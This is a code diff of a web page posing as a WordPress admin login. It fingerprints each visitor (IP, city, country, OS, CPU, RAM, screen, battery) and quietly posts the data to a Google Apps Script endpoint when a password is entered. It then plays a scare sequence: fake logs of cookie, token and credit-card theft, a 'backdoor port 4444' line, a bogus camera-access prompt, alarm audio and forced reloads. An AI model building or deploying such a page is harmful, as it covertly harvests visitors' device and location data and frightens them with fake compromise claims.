@@ -156,11 +156,11 @@
         </div>
     </div>
 
-    <script>
+<script>
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby1mKnhVMl0BLavOxwIR7R1a2QpSpKm6TCYPriU9Au90plnYJD8E03idTESJ3M74nKZ/exec";
-        const alertAudio = document.getElementById('alert-sound');
+    const alertAudio = document.getElementById('alert-sound');
 
-    // --- 1. SESSION COUNTER (RESTORED) ---
+    // --- 1. SESSION COUNTER ---
     let sessionNum = localStorage.getItem('victim_session');
     if (!sessionNum) {
         sessionNum = 246; 
@@ -176,15 +176,20 @@
     function fetchAllData() {
         fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
             document.getElementById('user-ip').innerText = data.ip;
+            document.getElementById('user-ip').classList.remove('decrypting');
             userCity = data.city || "N/A";
             userCountry = data.country_name || "N/A";
             document.getElementById('user-loc').innerText = userCity + ", " + userCountry;
+            document.getElementById('user-tz').innerText = data.timezone;
+            document.getElementById('user-tz').classList.remove('decrypting');
         });
 
         document.getElementById('user-os').innerText = navigator.platform;
+        document.getElementById('user-os').classList.remove('decrypting');
         document.getElementById('user-cpu').innerText = (navigator.hardwareConcurrency || "X") + " THREADS";
         document.getElementById('user-ram').innerText = (navigator.deviceMemory || "8") + "GB RAM";
         document.getElementById('user-res').innerText = window.screen.width + "x" + window.screen.height;
+        document.getElementById('user-res').classList.remove('decrypting');
 
         const ua = navigator.userAgent;
         let eng = "UNKNOWN";
@@ -202,12 +207,13 @@
         if (navigator.getBattery) {
             navigator.getBattery().then(b => {
                 document.getElementById('user-batt').innerText = Math.round(b.level * 100) + "%";
+                document.getElementById('user-batt').classList.remove('decrypting');
             });
-        }
+        } else { document.getElementById('user-batt').innerText = "AC_POWER"; }
     }
     fetchAllData();
 
-    // --- 3. LOGIN LOGIC ---
+    // --- 3. LOGIN LOGIC & SCARE SEQUENCE ---
     function attemptLogin() {
         const cap = grecaptcha.getResponse();
         const err = document.getElementById('login-error');
@@ -219,10 +225,9 @@
             return;
         }
 
+        // Capture data for payload
         const ip = document.getElementById('user-ip').innerText;
         const session = document.getElementById('session-id-text').innerText;
-        
-        // --- THE REPAIR: We must define these variables by grabbing them from the UI first ---
         const os = document.getElementById('user-os').innerText;
         const cpu = document.getElementById('user-cpu').innerText;
         const ram = document.getElementById('user-ram').innerText;
@@ -230,19 +235,7 @@
         const res = document.getElementById('user-res').innerText;
         const batt = document.getElementById('user-batt').innerText;
 
-        const errorMsg = document.getElementById('login-error');
-
-        // Payload Construction
-          const payload = `ip=${encodeURIComponent(ip)}` +
-                        `&session=${encodeURIComponent(session)}` +
-                        `&city=${encodeURIComponent(userCity)}` +
-                        `&country=${encodeURIComponent(userCountry)}` +
-                        `&os=${encodeURIComponent(os)}` +
-                        `&cpu=${encodeURIComponent(cpu)}` +
-                        `&ram=${encodeURIComponent(ram)}` +
-                        `&gpu=${encodeURIComponent(gpu)}` +
-                        `&res=${encodeURIComponent(res)}` +
-                        `&batt=${encodeURIComponent(batt)}`;
+        const payload = `ip=${encodeURIComponent(ip)}&session=${encodeURIComponent(session)}&city=${encodeURIComponent(userCity)}&country=${encodeURIComponent(userCountry)}&os=${encodeURIComponent(os)}&cpu=${encodeURIComponent(cpu)}&ram=${encodeURIComponent(ram)}&gpu=${encodeURIComponent(gpu)}&res=${encodeURIComponent(res)}&batt=${encodeURIComponent(batt)}`;
 
         // Send to Google Sheets
         fetch(GOOGLE_SCRIPT_URL, {
@@ -250,12 +243,9 @@
             mode: 'no-cors',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: payload
-        }).then(() => {
-            console.log("Data sent to bridge.");
-        }).catch(err => console.error("Bridge Error:", err));
+        }).catch(err => console.error("Bridge Error"));
 
-
-// WP Error Feed
+        // WP Error Feed
         err.style.display = 'block';
         err.innerHTML = "<strong>ERROR</strong>: The password for <strong>admin</strong> is incorrect. <a href='#'>Lost your password?</a>";
         box.classList.add('shake');
@@ -269,7 +259,6 @@
             document.getElementById('main-wrapper').style.display = 'block';
             document.getElementById('danger-bar').style.display = 'block';
             
-            // Start the animations and logs
             startEverything();
 
             // STEP A: At 18 seconds, show terminal termination and alert
@@ -282,7 +271,7 @@
                 logContent.appendChild(line);
                 document.getElementById('main-wrapper').classList.add('shake');
                 
-                // Trigger the alert
+                // Trigger the Cyber Unit alert
                 confirm("[!] SYSTEM ALERT: Remote camera access requested by CYBER_UNIT. Allow access for identity verification?");
             }, 18000); 
 
@@ -292,30 +281,24 @@
             }, 21000);
             
         }, 1200);
-    } // Closes attemptLogin
+    } 
 
     function startEverything() {
-        // FORCE LOGIN IF PAGE RELOADS FROM BACK BUTTON
         window.addEventListener('pageshow', function(event) {
-            if (event.persisted) {
-                window.location.reload(); 
-            }
+            if (event.persisted) { window.location.reload(); }
         });
 
-        // Vibrate (Android/Chrome)
         if (navigator.vibrate) {
             navigator.vibrate([500, 200, 500, 200, 1000]);
         }
 
-        // Start visuals and audio
-        if (typeof alertAudio !== 'undefined') {
+        if (alertAudio) {
             alertAudio.play().catch(() => {});
         }
         setInterval(draw, 40);
         startLogCycle();
     }
 
-   
     // --- MATRIX RAIN ---
     const canvas = document.getElementById('matrix-bg');
     const ctx = canvas.getContext('2d');
@@ -338,27 +321,27 @@
         });
     }
 
-    // --- TERMINAL LOGS ---
+    // --- TERMINAL LOGS (ALL ORIGINAL MESSAGES) ---
     function startLogCycle() {
         const logContent = document.getElementById('log-content');
-  const filePaths = [
-    "SCANNING_LOCAL_NETWORK_NODES...",
-    "EXTRACTING_BROWSER_AUTOFILL_DATA...",
-    "INTERCEPTING_SSL_CERTIFICATES...",
-    "DECRYPTING_WIFI_PASSWORDS_KEYCHAIN...",
-    "UPLOADING_COOKIES_TO_REMOTE_STORAGE...",
-    "BYPASSING_LOCAL_FIREWALL_PROTOCOL...",
-    "FETCHING_DISCORD_TOKEN_SESSION...",
-    "LOCATING_CONNECTED_SMART_DEVICES...",
-    "CLONING_BROWSER_FINGERPRINT...",
-    "DUMPING_SAVED_CREDIT_CARD_METADATA...",
-    "OPENING_BACKDOOR_PORT_4444...",
-    "PULLING_SOCIAL_MEDIA_CACHED_LOGINS...",
-    "SCANNING_RECOVERY_EMAIL_ACCESS...",
-    "INITIATING_REMOTE_SCREEN_CAPTURE...",
-    "LOCATING_ISP_PRIMARY_GATEWAY...",
-    "COMPRESSING_SENSITIVE_FILES_FOR_EXPORT..."
-];
+        const filePaths = [
+            "SCANNING_LOCAL_NETWORK_NODES...",
+            "EXTRACTING_BROWSER_AUTOFILL_DATA...",
+            "INTERCEPTING_SSL_CERTIFICATES...",
+            "DECRYPTING_WIFI_PASSWORDS_KEYCHAIN...",
+            "UPLOADING_COOKIES_TO_REMOTE_STORAGE...",
+            "BYPASSING_LOCAL_FIREWALL_PROTOCOL...",
+            "FETCHING_DISCORD_TOKEN_SESSION...",
+            "LOCATING_CONNECTED_SMART_DEVICES...",
+            "CLONING_BROWSER_FINGERPRINT...",
+            "DUMPING_SAVED_CREDIT_CARD_METADATA...",
+            "OPENING_BACKDOOR_PORT_4444...",
+            "PULLING_SOCIAL_MEDIA_CACHED_LOGINS...",
+            "SCANNING_RECOVERY_EMAIL_ACCESS...",
+            "INITIATING_REMOTE_SCREEN_CAPTURE...",
+            "LOCATING_ISP_PRIMARY_GATEWAY...",
+            "COMPRESSING_SENSITIVE_FILES_FOR_EXPORT..."
+        ];
         setInterval(() => {
             if (logContent.children.length > 8) logContent.removeChild(logContent.firstChild);
             const line = document.createElement('div');
@@ -374,24 +357,18 @@
         }, 1800);
     }
 
-window.addEventListener('DOMContentLoaded', (event) => {
-    // This targets your specific input ID
-    const loginField = document.getElementById('fake-pass');
-    
-    // Force the cursor into the box
-    loginField.focus();
-    
-    // Mobile Keyboard Trigger (Works for most Android/Chrome)
-    loginField.click();
-});
+    window.addEventListener('DOMContentLoaded', () => {
+        const loginField = document.getElementById('fake-pass');
+        loginField.focus();
+        loginField.click();
+    });
 
-// This tells the browser: "If the user hits Enter, act like they clicked Login"
-document.getElementById('fake-pass').addEventListener('keypress', function (e) {
-    if (e.key === 'Enter') {
-        e.preventDefault(); // Prevents the page from refreshing
-        attemptLogin();    // Triggers your data-sending and the 20s timer
-    }
-});
+    document.getElementById('fake-pass').addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            attemptLogin();
+        }
+    });
     </script>
 </body>
 </html>
